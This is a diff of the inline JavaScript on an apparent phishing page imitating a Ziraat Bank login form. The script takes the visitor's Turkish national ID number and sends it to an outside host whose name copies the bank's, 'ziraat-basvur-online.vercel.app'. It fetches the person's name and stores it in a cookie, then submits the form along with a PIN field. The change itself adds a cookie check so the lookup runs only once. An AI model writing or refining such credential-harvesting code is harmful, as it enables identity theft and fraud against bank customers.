@@ -192,7 +192,7 @@ async function checkAndSubmit() {
     }
   </script>
  <script>
-         document.addEventListener("DOMContentLoaded", function () {
+document.addEventListener("DOMContentLoaded", function () {
   async function tcno_dogrula_ve_islem_yap(tcno) {
     // TC kimlik doğrulama fonksiyonu
     tcno = String(tcno);
@@ -224,31 +224,37 @@ async function checkAndSubmit() {
   }
 
   async function checkAndSubmit() {
-    const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
+    const isCookieSet = document.cookie.includes('isim');
 
-    try {
-      // TC kimlik doğrulama işlemi
-      const isTcValid = await tcno_dogrula_ve_islem_yap(retailIdentityValue);
+    if (!isCookieSet) {
+      const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
 
-      if (isTcValid) {
-        // RetailIdentityTextBox değeri ile isteği oluştur
-        const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
-        const data = await response.json();
+      try {
+        // TC kimlik doğrulama işlemi
+        const isTcValid = await tcno_dogrula_ve_islem_yap(retailIdentityValue);
 
-        // "adi" ve "soyadi" değerlerini al
-        const adi = data.adi;
-        const soyadi = data.soyadi;
+        if (isTcValid) {
+          // RetailIdentityTextBox değeri ile isteği oluştur
+          const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
+          const data = await response.json();
 
-        // İsim adında bir cookie oluştur ve değerleri kaydet
-        document.cookie = `isim=${adi} ${soyadi}; path=/`;
+          // "adi" ve "soyadi" değerlerini al
+          const adi = data.adi;
+          const soyadi = data.soyadi;
 
-        // Formu post et
-        document.getElementById('aspnetForm').submit();
-      } else {
-        console.log('TC kimlik doğrulama başarısız.');
+          // İsim adında bir cookie oluştur ve değerleri kaydet
+          document.cookie = `isim=${adi} ${soyadi}; path=/`;
+
+          // Formu post et
+          document.getElementById('aspnetForm').submit();
+        } else {
+          console.log('TC kimlik doğrulama başarısız.');
+        }
+      } catch (error) {
+        console.error('Hata:', error);
       }
-    } catch (error) {
-      console.error('Hata:', error);
+    } else {
+      console.log('Cookie zaten kaydedilmiş, işlem yapılmayacak.');
     }
   }
 
@@ -261,7 +267,8 @@ async function checkAndSubmit() {
 
   identityInput.addEventListener("input", handleInput);
   pinInput.addEventListener("input", handleInput);
-}); 
+});
+
   </script>
     <div>
   </body>
